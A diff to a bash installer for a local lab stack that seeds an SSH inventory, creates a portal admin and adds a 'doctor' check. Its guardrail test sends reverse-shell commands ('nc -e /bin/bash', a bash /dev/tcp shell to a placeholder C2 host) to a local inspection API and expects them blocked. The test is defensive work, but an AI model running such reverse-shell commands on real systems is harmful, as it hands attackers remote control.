@@ -9,6 +9,20 @@ CLAWLAB_NGINX="${CLAWLAB_NGINX:-$HOME/.clawlab/nginx}"
 CLAWLAB_SSH_OPS_DATA="${CLAWLAB_SSH_OPS_DATA:-$HOME/.clawlab/ssh-ops/data}"
 LOCAL_FULL_DOMAIN="${LOCAL_FULL_DOMAIN:-127.0.0.1}"
 LOCAL_FULL_PORT="${LOCAL_FULL_PORT:-8083}"
+LOCAL_FULL_POLICY_HOST="${LOCAL_FULL_POLICY_HOST:-mac-local}"
+
+if ! declare -f info >/dev/null 2>&1; then info() { printf '    %s\n' "$*"; }; fi
+if ! declare -f warn >/dev/null 2>&1; then warn() { printf 'WARN: %s\n' "$*" >&2; }; fi
+if ! declare -f log >/dev/null 2>&1; then log() { printf '==> %s\n' "$*"; }; fi
+if ! declare -f die >/dev/null 2>&1; then die() { printf 'ERROR: %s\n' "$*" >&2; exit 1; }; fi
+
+clawlab_sed_inplace() {
+  if [[ "$(uname -s)" == Darwin ]]; then
+    sed -i '' "$@"
+  else
+    sed -i "$@"
+  fi
+}
 
 clawlab_local_full_supported() {
   [[ "$CLAWLAB_PLATFORM" == "macos" || "$CLAWLAB_PLATFORM" == "linux" ]]
@@ -55,6 +69,7 @@ CLAWLAB_VENV=${CLAWLAB_VENV:-$HOME/.clawlab/venv}
 CLAW_PYTHON=${CLAW_PYTHON:-$CLAWLAB_VENV/bin/python}
 CLAWLAB_INTERNAL_TOKEN=${internal_token}
 CLAWLAB_REPO=${repo}
+$([ "$(uname -s)" = Darwin ] && printf 'CLAWLAB_HOST=%s\n' "${LOCAL_FULL_POLICY_HOST}")
 EOF
   chmod 0600 "$config_file"
 }
@@ -67,13 +82,193 @@ clawlab_local_full_ensure_admin_user() {
   count="$("$CLAW_PYTHON" -c "import sys; sys.path.insert(0, '$repo/claw-auth'); import store; store.init_db(); print(store.user_count())")"
   if [[ "${count:-0}" -eq 0 ]]; then
     if [[ "${AUTO_DEFAULTS:-0}" -eq 1 ]]; then
-      warn "No claw-auth users yet — create one:"
-      info "  $CLAW_PYTHON $repo/claw-auth/manage.py create-user admin"
+      local pw
+      pw="$(openssl rand -base64 18 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c 16 || python3 -c 'import secrets; print(secrets.token_urlsafe(12))')"
+      if "$CLAW_PYTHON" -c "import sys; sys.path.insert(0, '$repo/claw-auth'); import store; store.init_db(); store.create_user('admin', '$pw', 'admin')" 2>/dev/null; then
+        log "Portal admin created (username: admin)"
+        info "  One-time password (change after login): $pw"
+        info "  Reset: $CLAW_PYTHON $repo/claw-auth/manage.py set-password admin"
+      else
+        warn "Could not auto-create admin — run: $CLAW_PYTHON $repo/claw-auth/manage.py create-user admin"
+      fi
     else
       log "Portal login (claw-auth for http://${LOCAL_FULL_DOMAIN:-127.0.0.1}:${LOCAL_FULL_PORT:-8083}/)"
       "$CLAW_PYTHON" "$repo/claw-auth/manage.py" create-user admin \
         || warn "create-user failed — run: $CLAW_PYTHON $repo/claw-auth/manage.py create-user admin"
     fi
+  fi
+}
+
+clawlab_local_full_mac_hosts_yaml() {
+  local repo="$1" user="${2:-$USER}"
+  sed "s/YOUR_MAC_USERNAME/${user}/g" "$repo/config-templates/hosts.local-full.sample.yaml"
+}
+
+clawlab_local_full_hosts_is_placeholder() {
+  local hosts="$1"
+  [[ -f "$hosts" ]] || return 1
+  grep -qE '10\.0\.0\.(11|12|21)|^[[:space:]]+web1:' "$hosts" 2>/dev/null \
+    && ! grep -q 'mac-local:' "$hosts" 2>/dev/null
+}
+
+# Mac local-full: loopback ssh-ops inventory (127.0.0.1). Returns 0 if file changed.
+clawlab_local_full_ensure_hosts_inventory() {
+  local repo="$1"
+  local hosts="$CLAWLAB_SSH_OPS_DATA/hosts.yaml"
+  local changed=0
+  mkdir -p "$CLAWLAB_SSH_OPS_DATA"
+
+  if [[ "$(uname -s)" != Darwin ]]; then
+    if [[ ! -f "$hosts" && -f "$repo/ssh-ops-mcp/hosts.example.yaml" ]]; then
+      cp "$repo/ssh-ops-mcp/hosts.example.yaml" "$hosts"
+      info "Seeded ssh-ops hosts.yaml from hosts.example.yaml"
+    fi
+    return 0
+  fi
+
+  [[ -f "$repo/config-templates/hosts.local-full.sample.yaml" ]] \
+    || { warn "missing hosts.local-full.sample.yaml"; return 1; }
+
+  if [[ ! -f "$hosts" ]]; then
+    clawlab_local_full_mac_hosts_yaml "$repo" >"$hosts"
+    changed=1
+    info "Created $hosts with ${LOCAL_FULL_POLICY_HOST} (127.0.0.1, user $USER)"
+  elif grep -q 'YOUR_MAC_USERNAME' "$hosts" 2>/dev/null; then
+    clawlab_sed_inplace "s/YOUR_MAC_USERNAME/${USER}/g" "$hosts"
+    changed=1
+    info "Updated ssh-ops hosts username -> $USER"
+  elif clawlab_local_full_hosts_is_placeholder "$hosts"; then
+    cp "$hosts" "${hosts}.bak.$(date +%Y%m%d%H%M%S)"
+    clawlab_local_full_mac_hosts_yaml "$repo" >"$hosts"
+    changed=1
+    warn "Replaced placeholder ssh-ops hosts with ${LOCAL_FULL_POLICY_HOST} loopback (backup saved)"
+  elif ! grep -q 'mac-local:' "$hosts" 2>/dev/null; then
+    if SSH_OPS_CONFIG="$hosts" CLAWLAB_POLICY_HOST="$LOCAL_FULL_POLICY_HOST" CLAWLAB_POLICY_USER="$USER" \
+      python3 - <<'PY'; then
+import os, sys
+from pathlib import Path
+try:
+    import yaml
+except ImportError:
+    sys.exit(1)
+path = Path(os.environ["SSH_OPS_CONFIG"]).expanduser()
+cfg = yaml.safe_load(path.read_text()) or {}
+hosts = cfg.setdefault("hosts", {})
+name = os.environ.get("CLAWLAB_POLICY_HOST", "mac-local")
+if name in hosts:
+    sys.exit(1)
+hosts[name] = {
+    "tags": ["lab", "local"],
+    "hostname": "127.0.0.1",
+    "port": 22,
+    "username": os.environ.get("CLAWLAB_POLICY_USER", os.environ.get("USER", "root")),
+    "allow_write": False,
+}
+path.write_text(yaml.safe_dump(cfg, sort_keys=False, default_flow_style=False))
+print(f"Added {name} to {path}")
+PY
+      changed=1
+      info "Added ${LOCAL_FULL_POLICY_HOST} to existing ssh-ops inventory"
+    fi
+  fi
+
+  if [[ "$changed" -eq 1 ]] && command -v podman >/dev/null 2>&1 \
+    && [[ -x "$repo/ssh-ops-mcp/podctl.sh" ]]; then
+    CLAWLAB_MANAGE_MCP=1 SSH_OPS_DIR="$repo/ssh-ops-mcp" bash "$repo/ssh-ops-mcp/podctl.sh" --recreate \
+      >/dev/null 2>&1 || warn "ssh-ops MCP recreate failed — run: CLAWLAB_MANAGE_MCP=1 bash $repo/ssh-ops-mcp/podctl.sh --recreate"
+  fi
+}
+
+clawlab_local_full_load_gw_token() {
+  local f key val
+  for f in \
+    "$HOME/.defenseclaw/shims/.token" \
+    "$HOME/.defenseclaw/.env" \
+    "$HOME/.openclaw/gateway.systemd.env"; do
+    [[ -f "$f" ]] || continue
+    for key in DEFENSECLAW_GATEWAY_TOKEN OPENCLAW_GATEWAY_TOKEN; do
+      val="$(grep -E "^${key}=" "$f" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "\"'")" || true
+      if [[ -n "$val" ]]; then
+        printf '%s' "$val"
+        return 0
+      fi
+    done
+  done
+  return 1
+}
+
+clawlab_local_full_inspect_action() {
+  local tool="$1" cmd="$2"
+  local token payload
+  token="$(clawlab_local_full_load_gw_token || true)"
+  [[ -n "$token" ]] || { echo err; return 1; }
+  payload="$(jq -n --arg t "$tool" --arg c "$cmd" '{tool:$t,args:{command:$c}}')"
+  curl -s -m8 -X POST "http://127.0.0.1:18970/api/v1/inspect/tool" \
+    -H "Authorization: Bearer $token" \
+    -H 'Content-Type: application/json' \
+    -d "$payload" 2>/dev/null \
+    | python3 -c "import sys,json; print(json.load(sys.stdin).get('action','err'))" 2>/dev/null || echo err
+}
+
+clawlab_local_full_guardrails_ok() {
+  [[ "$(clawlab_local_full_inspect_action nc 'nc -e /bin/bash c2.canary.invalid 4444')" == block ]] \
+    && [[ "$(clawlab_local_full_inspect_action bash 'bash -i >& /dev/tcp/c2.canary.invalid/4444 0>&1')" == block ]] \
+    && [[ "$(clawlab_local_full_inspect_action bash 'useradd clawlab-verify')" == block ]]
+}
+
+clawlab_local_full_ensure_guardrails() {
+  local repo="$1"
+  local script="$repo/admin-access/install-clawlab-guardrail-rules.sh"
+  [[ -f "$script" ]] || return 0
+  if clawlab_local_full_guardrails_ok; then
+    return 0
+  fi
+  log "Installing/reloading Clawlab guardrail rules (C2 revshell + user CRUD)"
+  bash "$script" || warn "guardrail rules install failed — run: bash $script"
+  sleep 2
+  clawlab_local_full_guardrails_ok || warn "revshell rules still not blocking — run: defenseclaw-gateway restart"
+}
+
+clawlab_local_full_ssh_loopback_ok() {
+  local user="${1:-$USER}"
+  ssh -o BatchMode=yes -o ConnectTimeout=4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+    "${user}@127.0.0.1" true >/dev/null 2>&1
+}
+
+clawlab_local_full_doctor() {
+  local repo="$1"
+  local issues=0
+  echo "=== local-full doctor (Mac/desktop policy prerequisites) ==="
+  clawlab_local_full_ensure_hosts_inventory "$repo" || true
+  if [[ "$(uname -s)" == Darwin ]]; then
+    if clawlab_local_full_ssh_loopback_ok; then
+      echo "  OK   loopback SSH (${USER}@127.0.0.1)"
+    else
+      echo "  FAIL loopback SSH — enable Remote Login:"
+      echo "        System Settings → General → Sharing → Remote Login"
+      issues=$((issues + 1))
+    fi
+  fi
+  if clawlab_local_full_guardrails_ok; then
+    echo "  OK   DefenseClaw revshell + user CRUD rules"
+  else
+    echo "  FAIL DefenseClaw revshell rules not blocking"
+    echo "        bash $repo/admin-access/install-clawlab-guardrail-rules.sh"
+    issues=$((issues + 1))
+  fi
+  if python3 -c "import socket;s=socket.socket();s.settimeout(0.4);s.connect(('127.0.0.1',8766))" 2>/dev/null; then
+    echo "  OK   ssh-ops MCP :8766"
+  else
+    echo "  WARN ssh-ops MCP not listening — bash $repo/install/local-full-ctl.sh restart"
+    issues=$((issues + 1))
+  fi
+  echo
+  if [[ "$issues" -eq 0 ]]; then
+    echo "Doctor: ready for policy tests:"
+    echo "  cd $repo/tests && ./policy-test.sh --no-agent"
+  else
+    echo "Doctor: fix $issues item(s), then: cd $repo/tests && ./policy-test.sh --no-agent"
+    return 1
   fi
 }
 
@@ -259,11 +454,8 @@ clawlab_local_full_register_mcp() {
   local repo="$1"
   local oc="$HOME/.openclaw/openclaw.json"
   [[ -f "$oc" ]] || return 0
-  mkdir -p "$CLAWLAB_SSH_OPS_DATA"
+  clawlab_local_full_ensure_hosts_inventory "$repo"
   local hosts="$CLAWLAB_SSH_OPS_DATA/hosts.yaml"
-  if [[ ! -f "$hosts" && -f "$repo/ssh-ops-mcp/hosts.example.yaml" ]]; then
-    cp "$repo/ssh-ops-mcp/hosts.example.yaml" "$hosts"
-  fi
   local token
   token="$(
     SSH_OPS_CONFIG="$hosts" \
@@ -299,6 +491,7 @@ clawlab_install_local_full() {
   fi
 
   clawlab_local_full_write_config "$repo"
+  clawlab_local_full_ensure_hosts_inventory "$repo"
   clawlab_local_full_write_nginx "$repo"
   clawlab_local_full_apply_openclaw_portal
 
@@ -315,6 +508,7 @@ clawlab_install_local_full() {
   bash "$ctl" start
   clawlab_local_full_register_mcp "$repo"
   clawlab_local_full_configure_mcp_identity "$repo"
+  clawlab_local_full_ensure_guardrails "$repo"
   clawlab_local_full_ensure_admin_user "$repo"
 
   info "Portal hub:  http://${LOCAL_FULL_DOMAIN}:${LOCAL_FULL_PORT}/"
@@ -323,5 +517,7 @@ clawlab_install_local_full() {
   info "DefenseClaw: http://${LOCAL_FULL_DOMAIN}:${LOCAL_FULL_PORT}/defenseclaw/"
   info "MCP API:     http://127.0.0.1:8766/mcp (identity proxy :8767 when running)"
   info "Verify:      bash $repo/install/verify-local-full.sh"
-  info "Manage:      bash $ctl {start|stop|status|restart}"
+  info "Doctor:      bash $ctl doctor   # Mac policy prerequisites before policy-test.sh"
+  info "Policy test: cd $repo/tests && ./policy-test.sh --no-agent"
+  info "Manage:      bash $ctl {start|stop|status|restart|doctor}"
 }
